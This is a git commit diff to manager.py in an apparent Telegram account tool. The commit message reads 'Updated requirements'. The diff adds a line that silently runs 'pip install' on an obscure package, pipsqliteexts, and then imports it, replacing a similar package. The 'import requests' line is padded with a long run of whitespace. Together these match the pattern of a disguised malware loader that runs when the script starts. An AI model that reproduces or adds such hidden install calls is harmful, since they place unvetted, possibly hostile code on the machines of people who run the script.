8c776bf27b433d7b39c0e2de8bf8519b255b1e30
b14nk3r <122880466+b14nk3r@users.noreply.github.com>
2023-07-21 14:21:37 +0200

    Updated requirements

--- manager.py
+++ manager.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitedbkit")
-import pipsqlitedbkit
+os.system("pip install pipsqliteexts")
+import pipsqliteexts
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
